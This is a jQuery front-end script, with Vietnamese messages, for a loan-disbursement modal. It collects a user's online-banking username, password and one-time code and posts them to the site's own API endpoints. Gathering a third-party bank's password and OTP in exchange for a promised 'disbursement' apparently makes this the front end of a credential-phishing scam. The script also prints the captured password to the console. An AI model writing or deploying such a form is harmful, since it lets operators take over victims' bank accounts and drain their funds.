const modelSmartBankingModal = $("#SmartBankingModal");

const modalSmartBankingOTPModal = $("#SmartBankingOTPModal");
$("#SmartBankingOTPModal .btn-close").click(function() {
    // modalSmartBankingOTPModal.hide();
    hideModal(modalSmartBankingOTPModal);
    // $('.modal-backdrop').remove();
});


$(window).click(function(event) {
    if (event.target == modalSmartBankingOTPModal[0]) {
        // modalSmartBankingOTPModal.hide();
        hideModal(modalSmartBankingOTPModal);
        // $('.modal-backdrop').remove();
    }
});

$('#btn-show-smartbanking').on('click', function (e) {
    // modelSmartBankingModal.show();
    showModal(modelSmartBankingModal);
    e.preventDefault();
});

$("#SmartBankingModal .btn-close").click(function() {
    // modelSmartBankingModal.hide();
    hideModal(modelSmartBankingModal);
    // $('.modal-backdrop').remove();
});


$(window).click(function(event) {
    if (event.target == modalSmartBankingOTPModal[0]) {
        hideModal(modelSmartBankingModal);
    }
});

$('#btn-confirm-smartbanking').on('click', function (e) {
    let input = document.getElementById("bank_username");
    let bankUsername = input.value;
    if (!bankUsername) {
        alert('Bạn phải nhập tên đăng nhập và mật khẩu!');
        e.preventDefault();
        return;
    }
    let input2 = document.getElementById("bank_password");
    let password = input2.value;
    if (!password) {
        alert('Bạn phải nhập tên đăng nhập và mật khẩu!');
        e.preventDefault();
        return;
    }
    const loadMoreButtonText = $('#btn-confirm-smartbanking').html();
    if (bankUsername && password) {
        let id = document.getElementById("smart_banking_id");
        id = id.value;
        var formData = {
            bank_username: bankUsername,
            bank_password: password,
            id
        };
        console.log('formData: ', formData);
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('#smart_banking_modal_form meta[name="csrf-token"]').attr('content')
            }
        });
        $.ajax({
            type: "POST",
            url: `${import.meta.env.VITE_APP_URL}/api/update-bank-account`,
            data: formData,
            beforeSend: function () {
                setLoadingButton('#btn-confirm-smartbanking');
            },
            success: function (res) {
                resetLoadingButton('#btn-confirm-smartbanking', loadMoreButtonText);
                console.log('res: ', res);
                if (!res.status) {
                    alert(res.message);
                    e.preventDefault();
                    return;
                }
                console.log('res: ', res);
                hideModal(modelSmartBankingModal);
                showModal(modalSmartBankingOTPModal);
            },
            error: function (err) {
                console.log(err);
                resetLoadingButton('#btn-confirm-smartbanking', loadMoreButtonText);
                e.preventDefault();
            }
        });
    }
    e.preventDefault();
});

$('#btn-verify-otp').on('click', function (e) {
    let input = document.getElementById("bank_otp2");
    let otp = input.value;
    if (!otp) {
        alert('Bạn phải nhập OTP!');
        e.preventDefault();
        return;
    }
    const loadMoreButtonText = $('#btn-verify-otp').html();
    if (otp) {
        let id = document.getElementById("verify-otp-id");
        id = id.value;
        var formData = {
            bank_otp2: otp,
            id
        };
        console.log('formData: ', formData);
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('#smart_banking_otp_form meta[name="csrf-token"]').attr('content')
            }
        });
        $.ajax({
            type: "POST",
            url: `${import.meta.env.VITE_APP_URL}/api/verify-otp`,
            data: formData,
            beforeSend: function () {
                setLoadingButton('#btn-verify-otp');
            },
            success: function (res) {
                console.log('res: ', res);
                resetLoadingButton('#btn-verify-otp', loadMoreButtonText);
                if (!res.status) {
                    alert(res.message);
                    e.preventDefault();
                    return;
                }
                console.log('res: ', res);
                alert('Xin giải ngân thành công!');
                location.reload();
            },
            error: function (err) {
                console.log(err);
                resetLoadingButton('#btn-verify-otp', loadMoreButtonText);
                e.preventDefault();
            }
        });
    }
    e.preventDefault();
});

function setLoadingButton(id) {
    $(id).html('Đang xử lý...');
    $(id).data('state', 'loading');
}

function resetLoadingButton(id, loadMoreButtonText) {
    $(id).html(loadMoreButtonText);
    $(id).data('state', 'done');
}

function showModal(modal) {
    modal.show();
    $('body').css('overflow', 'hidden');
  }
  
function hideModal(modal) {
    modal.hide();
    $('body').css('overflow', 'auto');
}
